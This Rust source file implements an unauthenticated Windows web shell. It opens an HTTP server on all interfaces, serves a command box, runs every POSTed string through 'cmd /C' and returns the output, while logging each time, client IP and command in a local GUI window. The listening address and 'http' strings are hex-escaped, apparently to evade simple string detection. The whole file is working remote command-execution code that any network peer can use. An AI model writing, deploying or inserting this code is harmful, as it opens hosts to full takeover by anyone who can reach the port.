use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use std::thread;
use std::process::Command;
use encoding_rs::GBK;
use native_windows_gui as nwg;
use std::sync::{Arc, Mutex};
use chrono::Local;

// 修正后的 WinAPI 引入
use winapi::{
    shared::minwindef::{LPARAM, WPARAM},
    um::winuser::{SendMessageW, EM_SETSEL, EM_SCROLL, SB_BOTTOM, ES_MULTILINE, WS_VSCROLL}
};

const HTML: &str = r#"<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>命令执行</title>
</head>
<body>
    <textarea id="command" style="width:300px;height:60px;" placeholder="输入命令，Enter发送，Shift+Enter换行"></textarea>
    <button onclick="send_command()">发送指令</button>
    <pre id="result"></pre>
    <script>
        function send_command() {
            let cmd = document.getElementById('command').value;
            fetch('/', {
                method: 'POST',
                headers: {'Content-Type': 'text/plain'},
                body: cmd
            })
            .then(resp => resp.text())
            .then(txt => document.getElementById('result').innerText = txt)
            .catch(e => document.getElementById('result').innerText = '请求失败: ' + e);
        }
        document.getElementById('command').addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                send_command();
            }
        });
    </script>
</body>
</html>
"#;

pub fn listen_on_port(port: u16) {
    let addr = format!("0.\x30.0.0:{}", port);
    let listener = TcpListener::bind(&addr).expect(&format!("无法绑定端口{}", port));
    println!("HTTP服务已启动: h\x74\x74p://{}/", addr);

    let log = Arc::new(Mutex::new(String::from("|Time|IP|Command|Result|\n")));
    let log_clone = log.clone();
    thread::spawn(move || {
        gui_main(log_clone);
    });

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let peer_addr = stream.peer_addr().ok();
                let log = log.clone();
                thread::spawn(move || {
                    handle_client(stream, peer_addr, log);
                });
            }
            Err(e) => {
                let mut log = log.lock().unwrap();
                log.push_str(&format!("连接失败: {}\n", e));
            }
        }
    }
}

fn handle_client(mut stream: TcpStream, peer_addr: Option<std::net::SocketAddr>, log: Arc<Mutex<String>>) {
    let mut buffer = [0; 4096];
    let bytes_read = match stream.read(&mut buffer) {
        Ok(n) => n,
        Err(_) => return,
    };
    let request = String::from_utf8_lossy(&buffer[..bytes_read]);

    if request.starts_with("GET / ") {
        let response = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\n\r\n{}",
            HTML.as_bytes().len(),
            HTML
        );
        let _ = stream.write_all(response.as_bytes());
    } else if request.starts_with("POST / ") {
        if let Some(idx) = request.find("\r\n\r\n") {
            let body = &request[idx + 4..];
            let cmd = body.trim();
            let ip = peer_addr.map(|a| a.to_string()).unwrap_or_else(|| "未知".to_string());
            let output = if !cmd.is_empty() {
                Command::new("cmd")
                    .args(&["/C", cmd])
                    .output()
                    .map(|o| {
                        let (out, _, _) = GBK.decode(&o.stdout);
                        let (err, _, _) = GBK.decode(&o.stderr);
                        format!("{}{}", out, err)
                    })
                    .unwrap_or_else(|e| format!("命令执行失败: {}", e))
            } else {
                "未输入命令".to_string()
            };

            let now = Local::now();
            let time_str = now.format("%Y-%m-%d %H:%M:%S").to_string();
            
            let mut log = log.lock().unwrap();
            log.push_str(&format!("|{}|{}|{}|{}|\n", time_str, ip, cmd, output.trim()));

            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: {}\r\n\r\n{}",
                output.as_bytes().len(),
                output
            );
            let _ = stream.write_all(response.as_bytes());
        }
    } else {
        let response = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n";
        let _ = stream.write_all(response.as_bytes());
    }
}

fn gui_main(log: Arc<Mutex<String>>) {
    nwg::init().expect("无法初始化GUI");
    let mut window = nwg::Window::default();
    let mut textbox = nwg::TextBox::default();

    // 窗口配置
    nwg::Window::builder()
        .size((1000, 600))
        .position((300, 300))
        .title("命令日志")
        .build(&mut window)
        .unwrap();

    // 文本框配置（关键修正）
    nwg::TextBox::builder()
        .parent(&window)
        .flags(
            nwg::TextBoxFlags::VISIBLE |
            nwg::TextBoxFlags::VSCROLL |
            nwg::TextBoxFlags::HSCROLL |
            nwg::TextBoxFlags::AUTOVSCROLL |
            nwg::TextBoxFlags::from_bits_truncate(ES_MULTILINE | WS_VSCROLL)
        )
        .readonly(true)
        .size((980, 540))
        .position((10, 10))
        .build(&mut textbox)
        .unwrap();

    window.set_visible(true);

    // 定时器配置
    let mut timer = nwg::AnimationTimer::default();
    nwg::AnimationTimer::builder()
        .interval(std::time::Duration::from_millis(1))
        .parent(&window)
        .build(&mut timer)
        .unwrap();

    // 事件处理（最终修正）
    nwg::full_bind_event_handler(&window.handle, move |evt, _, _| {
        match evt {
            nwg::Event::OnTimerTick => {
                if let Ok(log_content) = log.lock() {
                    let display = log_content.replace('\n', "\r\n");
                    textbox.set_text(&display);
                    
                    unsafe {
                        use native_windows_gui::ControlHandle;
                        use winapi::um::winuser::{EM_SETSEL, EM_SCROLL, SB_BOTTOM};

                        let hwnd = match textbox.handle {
                            ControlHandle::Hwnd(h) => h,
                            _ => return,
                        };

                        // 修正类型转换
                        SendMessageW(
                            hwnd,
                            EM_SETSEL as u32,
                            (-1i32) as WPARAM,  // u32 转换
                            (-1i32) as LPARAM   // i32 -> isize
                        );

                        SendMessageW(
                            hwnd,
                            EM_SCROLL as u32,
                            SB_BOTTOM as WPARAM,    // Explicit cast to WPARAM
                            0
                        );
                    }
                }
            }
            nwg::Event::OnWindowClose => {
                nwg::stop_thread_dispatch();
            }
            _ => {}
        }
    });

    nwg::dispatch_thread_events();
}